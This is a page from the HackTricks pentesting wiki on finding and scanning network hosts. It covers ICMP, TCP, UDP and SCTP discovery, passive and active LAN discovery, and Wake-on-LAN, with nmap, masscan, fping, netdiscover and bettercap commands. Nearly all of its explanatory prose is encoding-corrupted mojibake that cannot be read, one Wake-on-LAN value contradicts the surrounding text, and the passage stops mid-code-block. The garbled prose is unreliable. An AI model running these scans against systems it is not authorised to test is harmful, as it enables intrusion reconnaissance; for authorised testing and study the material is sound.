# Pentesting Network

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Discovering hosts from the outside

рдпрд╣ рдПрдХ **рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдЕрдиреБрднрд╛рдЧ** рд╣реИ рдХрд┐ рдХреИрд╕реЗ **рдЗрдВрдЯрд░рдиреЗрдЯ** рд╕реЗ **IP** рдЦреЛрдЬреЗрдВ рдЬреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рджреЗ рд░рд╣реЗ рд╣реИрдВред\
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреБрдЫ **IP рдХрд╛ рджрд╛рдпрд░рд╛** (рд╢рд╛рдпрдж рдХрдИ **рд░реЗрдВрдЬ** рднреА) рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдмрд╕ рдпрд╣ рдкрддрд╛ рдХрд░рдирд╛ рд╣реИ рдХрд┐ **рдХреМрди рд╕реЗ IP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗ рд░рд╣реЗ рд╣реИрдВ**ред

### ICMP

рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ **рд╕рдмрд╕реЗ рдЖрд╕рд╛рди** рдФрд░ **рддреЗрдЬрд╝** рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╣реЛрд╕реНрдЯ рдЪрд╛рд▓реВ рд╣реИ рдпрд╛ рдирд╣реАрдВред\
рдЖрдк рдХреБрдЫ **ICMP** рдкреИрдХреЗрдЯ рднреЗрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреА рдЙрдореНрдореАрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдмрд╕ рдПрдХ **рдЗрдХреЛ рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдирд╛ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЙрдореНрдореАрдж рдХрд░рдирд╛ рд╣реИред рдЖрдк рдЗрд╕реЗ рдПрдХ рд╕рд╛рдзрд╛рд░рдг `ping` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╛ **рд░реЗрдВрдЬ** рдХреЗ рд▓рд┐рдП `fping` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк **nmap** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп ICMP рдЗрдХреЛ рдЕрдиреБрд░реЛрдз-рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдлрд╝рд┐рд▓реНрдЯрд░ рд╕реЗ рдмрдЪрдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдЧрд╛)ред
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

рдпрд╣ рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред рдлрд┐рд░, рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЗ рдЪрд╛рд▓реВ рд╣реЛрдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЬреЛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **рдЦреБрд▓реЗ рдкреЛрд░реНрдЯ рдЦреЛрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛**ред рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдХреЗ рдкрд╛рд╕ **65535 рдкреЛрд░реНрдЯ** рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ "рдмрдбрд╝рд╛" рджрд╛рдпрд░рд╛ рд╣реИ рддреЛ рдЖрдк **рдкреНрд░рддреНрдпреЗрдХ рдкреЛрд░реНрдЯ** рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рдХрд┐ рд╡рд╣ рдЦреБрд▓рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдЗрд╕рд╕реЗ рдмрд╣реБрдд рд╕рдордп рд▓рдЧреЗрдЧрд╛ред\
рдлрд┐рд░, рдЖрдкрдХреЛ рдПрдХ **рддреЗрдЬрд╝ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд░** ([masscan](https://github.com/robertdavidgraham/masscan)) рдФрд░ **рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯреНрд╕** рдХреА рдПрдХ рд╕реВрдЪреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
рдЖрдк рдЗрд╕ рдЪрд░рдг рдХреЛ `nmap` рдХреЗ рд╕рд╛рде рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рдзреАрдорд╛ рд╣реИ рдФрд░ рдХреБрдЫ рд╣рдж рддрдХ `nmap` рдХреЛ рд╣реЛрд╕реНрдЯ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдорд╕реНрдпрд╛рдПрдБ рд╣реЛрддреА рд╣реИрдВред

### HTTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ TCP рдкреЛрд░реНрдЯ рдЦреЛрдЬ рд╣реИ рдЬреЛ рддрдм рдЙрдкрдпреЛрдЧреА рд╣реЛрддреА рд╣реИ рдЬрдм рдЖрдк **HTTP** **рд╕реЗрд╡рд╛рдУрдВ** рдХреА рдЦреЛрдЬ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

рдЖрдк рдХреБрдЫ **UDP рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛** рд╣реЛрдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рддрдп рдХрд░ рд╕рдХреЗрдВ рдХрд┐ рдЖрдкрдХреЛ **рд╣реЛрд╕реНрдЯ** рдкрд░ **рдЕрдзрд┐рдХ рдзреНрдпрд╛рди** рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП рдпрд╛ рдирд╣реАрдВред рдЪреВрдВрдХрд┐ UDP рд╕реЗрд╡рд╛рдПрдБ рдЖрдорддреМрд░ рдкрд░ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЦрд╛рд▓реА UDP рдкреНрд░реЙрдм рдкреИрдХреЗрдЯ рдкрд░ **рдХреЛрдИ рдбреЗрдЯрд╛** рдХреЗ рд╕рд╛рде **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ рджреЗрддреАрдВ**, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХрд╣рдирд╛ рдореБрд╢реНрдХрд┐рд▓ рд╣реИ рдХрд┐ рдХреЛрдИ рдкреЛрд░реНрдЯ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдЦреБрд▓рд╛ рд╣реИред рдЗрд╕реЗ рддрдп рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк рдЪрд▓ рд░рд╣реА рд╕реЗрд╡рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВ, рдФрд░ рдЪреВрдВрдХрд┐ рдЖрдк рдирд╣реАрдВ рдЬрд╛рдирддреЗ рдХрд┐ рдХреМрди рд╕реА рд╕реЗрд╡рд╛ рдЪрд▓ рд░рд╣реА рд╣реИ, рдЖрдкрдХреЛ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕рдмрд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реЗрд╡рд╛ рдХреЛ рдЖрдЬрдорд╛рдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
nmap рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд▓рд╛рдЗрди рд╣рд░ рд╣реЛрд╕реНрдЯ рдХреЗ **/24** рд░реЗрдВрдЬ рдореЗрдВ **рд╢реАрд░реНрд╖ 1000 UDP рдкреЛрд░реНрдЯ** рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдЧреА рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рдпрд╣реА рдХрд░рдиреЗ рдореЗрдВ **>20min** рд▓рдЧреЗрдЧрд╛ред рдпрджрд┐ рдЖрдкрдХреЛ **рддреЗрдЬрд╝ рдкрд░рд┐рдгрд╛рдо** рдЪрд╛рд╣рд┐рдП рддреЛ рдЖрдк [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `./udp-proto-scanner.pl 199.66.11.53/24` рдпрд╣ рдЗрди **UDP рдкреНрд░реЙрдмреНрд╕** рдХреЛ рдЙрдирдХреЗ **рдЕрдкреЗрдХреНрд╖рд┐рдд рдкреЛрд░реНрдЯ** рдкрд░ рднреЗрдЬреЗрдЧрд╛ (рдПрдХ /24 рд░реЗрдВрдЬ рдХреЗ рд▓рд┐рдП рдпрд╣ рдХреЗрд╡рд▓ 1 рдорд┐рдирдЯ рд▓реЗрдЧрд╛): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

рдпрд╣рд╛рдБ рдЖрдкрдХреЛ рд▓реЗрдЦрди рдХреЗ рд╕рдордп рдХреЗ рд╕рднреА рдкреНрд░рд╕рд┐рджреНрдз Wifi рд╣рдорд▓реЛрдВ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рдЧрд╛рдЗрдб рдорд┐рд▓реЗрдЧрд╛:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Discovering hosts from the inside

рдпрджрд┐ рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ рдЖрдк рдЬреЛ рдкрд╣рд▓реА рдЪреАрдЬ рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ рд╡рд╣ рд╣реИ **рдЕрдиреНрдп рд╣реЛрд╕реНрдЯреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛**ред **рдЖрдк рдХрд┐рддрдиреА рдЖрд╡рд╛рдЬрд╝** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ/рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЗрд╕рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рд╡рд┐рднрд┐рдиреНрди рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

### Passive

рдЖрдк рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЬреБрдбрд╝реЗ рд╣реБрдП рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реЛрд╕реНрдЯреЛрдВ рдХрд╛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рд░реВрдк рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ [_**рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдЦреЛрдЬрдиреЗ рдХреА рддрдХрдиреАрдХреЗрдВ**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ_) рдХреЛ рднреА **рдпрд╣рд╛рдВ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред\
рд▓реЗрдХрд┐рди, рдЪреВрдВрдХрд┐ рдЖрдк рдЕрдиреНрдп рд╣реЛрд╕реНрдЯ рдХреЗ **рд╕рдорд╛рди рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ рд╣реИрдВ, рдЖрдк **рдФрд░ рдЕрдзрд┐рдХ рдЪреАрдЬреЗрдВ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ _Discovering hosts from the outside_ ([_**ICMP**_](./#icmp)) рдореЗрдВ рдЯрд┐рдкреНрдкрдгреА рдХреА рдЧрдИ рддрдХрдиреАрдХреЗрдВ рдпрд╣рд╛рдБ рднреА **рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
рд▓реЗрдХрд┐рди, рдЪреВрдВрдХрд┐ рдЖрдк рдЕрдиреНрдп рд╣реЛрд╕реНрдЯ рдХреЗ **рд╕рдорд╛рди рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ рд╣реИрдВ, рдЖрдк **рдЕрдзрд┐рдХ рдЪреАрдЬреЗрдВ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* рдпрджрд┐ рдЖрдк **ping** рдПрдХ **subnet broadcast address** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдкрд┐рдВрдЧ **рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ** рддрдХ рдкрд╣реБрдВрдЪрдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ рд╡реЗ **рдЖрдкрдХреЛ** **рдЙрддреНрддрд░** рджреЗ рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 10.10.5.255`
* **Network broadcast address** рдХреЛ рдкрд┐рдВрдЧ рдХрд░рдиреЗ рдкрд░ рдЖрдк **рдЕрдиреНрдп subnets** рдХреЗ рдЕрдВрджрд░ рд╣реЛрд╕реНрдЯ рднреА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 255.255.255.255`
* рд╣реЛрд╕реНрдЯ рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `nmap` рдХреЗ `-PE`, `-PP`, `-PM` рдлреНрд▓реИрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЬреЛ рдХреНрд░рдорд╢рдГ **ICMPv4 echo**, **timestamp**, рдФрд░ **subnet mask requests** рднреЗрдЬрддреЗ рд╣реИрдВ: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреЛ **рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрджреЗрд╢** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдЪрд╛рд▓реВ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рдЪрд╛рд▓реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЬрд╛рджреБрдИ рдкреИрдХреЗрдЯ рдХреЗрд╡рд▓ рдПрдХ рдкреИрдХреЗрдЯ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **MAC Dst** рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ **16 рдмрд╛рд░ рджреЛрд╣рд░рд╛рдпрд╛** рдЬрд╛рддрд╛ рд╣реИред\
рдлрд┐рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯ рдЖрдорддреМрд░ рдкрд░ **ethernet 0x0842** рдореЗрдВ рдпрд╛ **UDP рдкреИрдХреЗрдЯ рдХреЛ рдкреЛрд░реНрдЯ 9** рдкрд░ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред\
рдпрджрд┐ **рдХреЛрдИ \[MAC]** рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдкреИрдХреЗрдЯ **broadcast ethernet** рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдФрд░ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ MAC рд╡рд╣реА рд╣реЛрдЧрд╛ рдЬреЛ рджреЛрд╣рд░рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scanning Hosts

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рд╕рднреА IPs (рдмрд╛рд╣рд░реА рдпрд╛ рдЖрдВрддрд░рд┐рдХ) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд▓реЗрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЧрд╣рд░рд╛рдИ рд╕реЗ рд╕реНрдХреИрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рд╡рд┐рднрд┐рдиреНрди рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред

### TCP

* **Open** port: _SYN --> SYN/ACK --> RST_
* **Closed** port: _SYN --> RST/ACK_
* **Filtered** port: _SYN --> \[NO RESPONSE]_
* **Filtered** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDP рдкреЛрд░реНрдЯ рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 2 рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ:

* рдПрдХ **UDP рдкреИрдХреЗрдЯ** рднреЗрдЬреЗрдВ рдФрд░ рдпрджрд┐ рдкреЛрд░реНрдЯ **рдмрдВрдж** рд╣реИ рддреЛ _**ICMP рдЕрдиреБрдкрд▓рдмреНрдз**_ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ ICMP **рдлрд┐рд▓реНрдЯрд░** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рдорд┐рд▓реЗрдЧреА рдХрд┐ рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ рдпрд╛ рдЦреБрд▓рд╛)ред
* рдПрдХ **рдлреЙрд░реНрдореЗрдЯреЗрдб рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо** рднреЗрдЬреЗрдВ рддрд╛рдХрд┐ рдПрдХ **рд╕реЗрд╡рд╛** (рдЬреИрд╕реЗ, DNS, DHCP, TFTP, рдФрд░ рдЕрдиреНрдп, рдЬреЛ _nmap-payloads_ рдореЗрдВ рд╕реВрдЪреАрдмрджреНрдз рд╣реИрдВ) рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХреЗред рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдкреЛрд░реНрдЯ **рдЦреБрд▓рд╛** рд╣реИред

**Nmap** "-sV" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рджреЛрдиреЛрдВ** рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЛ **рдорд┐рд╢реНрд░рд┐рдд** рдХрд░реЗрдЧрд╛ (UDP рд╕реНрдХреИрди рдмрд╣реБрдд рдзреАрдореЗ рд╣реЛрддреЗ рд╣реИрдВ), рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ UDP рд╕реНрдХреИрди TCP рд╕реНрдХреИрди рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдзреАрдореЗ рд╣реЛрддреЗ рд╣реИрдВ:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** рдХреЛ **TCP (Transmission Control Protocol)** рдФрд░ **UDP (User Datagram Protocol)** рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп IP рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЯреЗрд▓реАрдлреЛрдиреА рдбреЗрдЯрд╛ рдХреЗ рдкрд░рд┐рд╡рд╣рди рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдирд╛ рд╣реИ, рдЬреЛ **Signaling System 7 (SS7)** рдореЗрдВ рдкрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрдИ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред **SCTP** **SIGTRAN** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкрд░рд┐рд╡рд╛рд░ рдХрд╛ рдПрдХ рдореБрдЦреНрдп рдШрдЯрдХ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп IP рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ SS7 рд╕рдВрдХреЗрддреЛрдВ рдХрд╛ рдкрд░рд┐рд╡рд╣рди рдХрд░рдирд╛ рд╣реИред

**SCTP** рдХреЗ рд▓рд┐рдП рд╕рдорд░реНрдерди рд╡рд┐рднрд┐рдиреНрди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, рдФрд░ **VxWorks**, рдЬреЛ рдЯреЗрд▓реА рд╕рдВрдЪрд╛рд░ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдХреЗ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рдЗрд╕рдХреА рд╡реНрдпрд╛рдкрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдФрд░ рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред

nmap рджреНрд╡рд╛рд░рд╛ SCTP рдХреЗ рд▓рд┐рдП рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕реНрдХреИрди рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: _-sY_ рдФрд░ _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
